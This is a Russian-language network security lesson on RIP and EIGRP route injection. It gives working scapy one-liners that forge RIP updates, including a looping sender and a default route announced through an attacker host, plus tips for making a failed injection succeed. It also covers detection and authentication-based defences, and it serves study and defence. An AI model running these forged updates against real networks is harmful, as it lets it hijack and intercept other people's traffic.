## Вопрос, с которого всё начинается

Роутеры узнают маршруты друг от друга, обмениваясь ими по протоколам маршрутизации. Простейшие из них — **RIP** и **EIGRP** — работают по принципу «расскажи соседям, что я знаю». И если этот рассказ никто не подписывает, любой в сегменте может добавить в него своё: «к той сети ближе всего я». Тогда чужой трафик пойдёт через атакующего.

Разберём, как это работает и как защититься.

Этот урок продолжает [`network-module-routing`](network-module-routing) и [`network-routing`](network-routing).

## Наш пример: слушаем RIP-обновления

RIP-роутеры рассылают обновления каждые 30 секунд. Захватываем их:

```
$ sudo tcpdump -i eth0 -nn -v 'udp port 520' -c 2
10.0.0.1.520 > 224.0.0.9.520: RIPv2, Response, length 44
    /10.20.0.0/255.255.0.0, metric 1
```

Читаем: роутер `10.0.0.1` объявляет сеть `10.20.0.0/16` с метрикой **1**. Метрика в RIP — это число **хопов** до сети. Разберём правила.

## Шаг 1: RIP — дистанционно-векторный протокол

RIP распространяет маршруты как «вектор расстояния»: сеть + число хопов. Проще говоря, каждый роутер говорит соседям «до этой сети — N шагов», а те прибавляют свои шаги и передают дальше.

- максимум **15 хопов** (16 = недостижимо);
- обновления каждые **30 секунд**, multicast `224.0.0.9` (RIPv2);
- метрика — только число хопов (скорость канала не учитывается).

Пакет RIPv2: команда (1=request, 2=response), версия, затем до 25 записей «AFI, route tag, IP, mask, next hop, metric». Есть опция **аутентификации** (пароль или MD5), но её часто **не включают**.

## Шаг 2: EIGRP — гибридный протокол

EIGRP (Cisco) — «гибрид»: считает метрику по **bandwidth** и **delay**, поддерживает соседство через Hello. Пакеты идут по IP-протоколу **88**. Типы: Hello, Update, Query, Reply, Ack.

```
$ sudo tcpdump -i eth0 -nn 'ip proto 88' -c 3
10.0.0.1 > 224.0.0.10: EIGRP, Hello, AS 100
```

## Шаг 3: атака — поддельные update

Атакующий отправляет RIP-ответ с выгодной метрикой (например, 1 хоп) и объявляет себя следующим хопом к целевой сети. Соседи обновляют таблицу маршрутов и направляют трафик через него:

```python
from scapy.all import *
rip = RIP(cmd=2) / RIPEntry(AFI=2, addr="10.20.0.0", mask="255.255.0.0", metric=1)
send(IP(dst="224.0.0.9")/UDP(sport=520, dport=520)/rip, loop=1, inter=5)
```

Здесь `metric=1` — «я в одном хопе от сети `10.20.0.0/16`». Если настоящий путь длиннее, соседи выберут наш маршрут. Для EIGRP инъекция сложнее (нужен корректный формат TLV), но принцип тот же.

## Шаг 4: как обнаружить инъекцию

```
$ tshark -r cap.pcap -Y 'rip.cmd==2' -T fields -e ip.src -e rip.ip -e rip.metric | head
10.0.0.1    10.20.0.0    1
10.0.0.66   10.20.0.0    1
```

Признаки атаки: update с малой метрикой от **неизвестного** источника, всплеск частоты (легитимно — раз в 30 с), «новый» next hop.

## Шаг 5: защита

| Мера | Против чего |
|---|---|
| **Аутентификация** RIPv2/EIGRP (MD5/SHA) | поддельные update |
| **passive-interface** на краевых портах | отправка update наружу |
| Фильтрация протоколов на периметре | инъекции извне |
| Не использовать RIP в больших сетях | слабость метрики |
| Мониторинг изменений RIB | детект хайджекинга |

Настройка аутентификации RIPv2 на Cisco:

```text
key chain RIPKEY
 key 1
  key-string Secret123
interface Gi0/1
 ip rip authentication mode md5
 ip rip authentication key-chain RIPKEY
```

Ключевой вывод: и RIP, и EIGRP **умеют** аутентифицироваться, но по умолчанию — нет. Включение MD5/SHA и passive-interface закрывает почти все практические векторы.

## Шаг 6: сравнение RIP, OSPF и EIGRP

| Свойство | RIP | OSPF | EIGRP |
|---|---|---|---|
| Тип | distance-vector | link-state | hybrid |
| Метрика | хопы | cost (bandwidth) | bandwidth/delay |
| Транспорт | UDP/520 | IP proto 89 | IP proto 88 |
| Сходимость | медленная | быстрая | быстрая |
| Масштаб | малый | большой | большой |
| Вендор | все | все | Cisco |

RIP и EIGRP редко встречаются в современных крупных сетях, но в промышленных и устаревших сегментах они живы — и там почти всегда без аутентификации.

## Если не сработало

Инъекция не уводит трафик? Проверь:

- **Включена аутентификация.** Тогда подделанный update отбросят — это и есть защита.
- **Слишком большая метрика.** RIP предпочтёт более короткий путь; метрика должна быть меньше легитимной.
- **Разные домены.** RIP-анонс должен попадать в тот же домен маршрутизации, что и соседи.
- **Слишком редкие пакеты.** RIP сходится медленно и может «перезаписать» твой анонс легитимным — шли обновления чаще.

## Лаборатория: RIP на FRR

Поднять RIP и воспроизвести инъекцию можно без железа:

```
$ sudo vtysh -c 'configure terminal' -c 'router rip' -c 'version 2' -c 'network 10.0.0.0/24'
$ sudo tcpdump -i eth0 -nn 'udp port 520'
$ sudo vtysh -c 'show ip route rip'
```

Без аутентификации инъекция занимает секунды: scapy-пакет с `metric=1` заставляет соседей направить трафик через атакующего. После добавления `key chain` с MD5 тот же пакет уже не пройдёт.

## Формат пакета EIGRP

Чтобы подделать EIGRP-update, нужно понимать его формат. Заголовок содержит opcode (Hello=5, Update=1, Query=3, Reply=4), checksum, номер AS и дальше TLV-блоки:

| Поле | Смысл |
|---|---|
| Opcode | тип сообщения |
| Autonomous System | номер AS (должен совпадать) |
| K-values | какие компоненты метрики учитывать |
| TLV 0x0102 | параметры маршрута (next hop, метрика) |

Посмотреть, какие EIGRP-пакеты ходят в сегменте:

```
$ tshark -r cap.pcap -Y 'eigrp' -T fields -e eigrp.opcode -e ip.src | sort | uniq -c
```

## Что мы теперь знаем

- RIP считает хопы (макс. 15), шлёт обновления на `224.0.0.9:520`.
- EIGRP — гибридный, работает по IP-протоколу 88, метрика по bandwidth/delay.
- Поддельный update с лучшей метрикой уводит трафик через атакующего.
- Признаки атаки — малая метрика от неизвестного источника и всплеск частоты.
- Защита — аутентификация MD5/SHA, passive-interface, фильтрация на периметре.
- RIP сходится медленно (обновления раз в 30 с), поэтому поддельный анонс может жить в таблицах довольно долго.

## Разбираем RIP-пакет побайтово

Вернёмся к нашим RIP-обновлениям. RIP ходит по UDP/520, и пакет — это простой список записей «сеть / маска / шлюз / метрика». Посмотрим:

```
$ tshark -r rip.pcap -Y rip -V -c 1 | grep -E 'Command|Version|IP Address|Metric' | head -8
Command: 2 (Response)
Version: 2
  IP Address: 10.10.0.0
  Subnet Mask: 255.255.255.0
  Metric: 1
```

Читается так: `Command 2` — ответ (обновление), `Version 2`, маршрут `10.10.0.0/24` доступен с метрикой `1` (один хоп). Метрика — это «стоимость»: чем меньше, тем привлекательнее маршрут. Предел — **16 = бесконечность** (недостижимо), что и ограничивает размер сети.

## Почему поддельный update уводит трафик

RIP **не аутентифицирует** обновления (в v1 и по умолчанию в v2). Значит, любой в сегменте может отправить Response с «лучшим» маршрутом:

```
$ sudo python3 -c "from scapy.all import *; \
sendp(Ether()/IP(dst='224.0.0.9')/UDP(sport=520,dport=520)/RIP(cmd=2,version=2)/RIPEntry(dst='0.0.0.0',mask='0.0.0.0',gw='10.0.0.66',metric=1), iface='eth0')"
```

Мы объявили **default route** (`0.0.0.0/0`) через себя с метрикой 1. Если настоящий маршрут имеет метрику больше — соседи переключатся на нас, и **весь их трафик** пойдёт через наш хост. Это RIP-инъекция: тихий перехват на уровне маршрутизации.

## EIGRP: сложнее, но с той же идеей

EIGRP — «гибридный» протокол (дистанционно-векторный + характеристики канала). Его пакет содержит TLV-поля:

| TLV | Что несёт |
|---|---|
| 0x0001 | параметры EIGRP (AS, K-values) |
| 0x0102 | внутренний маршрут |
| 0x0103 | внешний маршрут |
| 0x0402 | hello/parameters |

EIGRP использует **multicast 224.0.0.10** и собственный транспорт (IP proto 88). Он умеет аутентификацию (MD5/SHA), но она должна быть **включена** — по умолчанию обновления открыты. Метрика считается из пропускной способности и задержки, поэтому подделать «лучший» маршрут сложнее, чем в RIP, но возможно при нулевых значениях.

## Как обнаружить инъекцию

Признаки в дампе: обновления от адреса, который **не является** известным роутером; маршрут, меняющий шлюз на незнакомый; всплеск обновлений (flapping). Проверка на маршрутизаторе:

```
$ show ip route 10.10.0.0
Routing entry for 10.10.0.0/24
  Known via "rip", distance 120, metric 1
  Last update from 10.0.0.66 on eth0
```

`Last update from 10.0.0.66` — если это не твой роутер, маршрут уведён.

## Если обновления не принимаются

Причины. Первая — **аутентификация включена** (key chain на RIP/EIGRP), и поддельный пакет отбрасывается. Вторая — **split horizon / poison reverse** не дают маршруту распространиться в обратную сторону, и твоя инъекция не уходит дальше. Третья — сеть использует **OSPF** (link-state, IP proto 89), где тактика другая: там надо стать DR/BDR, а не слать update. Четвёртая — маршрутизатор просто не слушает 520/88 на этом интерфейсе. Всегда сверяй, какой протокол реально бежит в сегменте: `tcpdump -i eth0 -nn 'ip proto 89 or udp port 520'`.
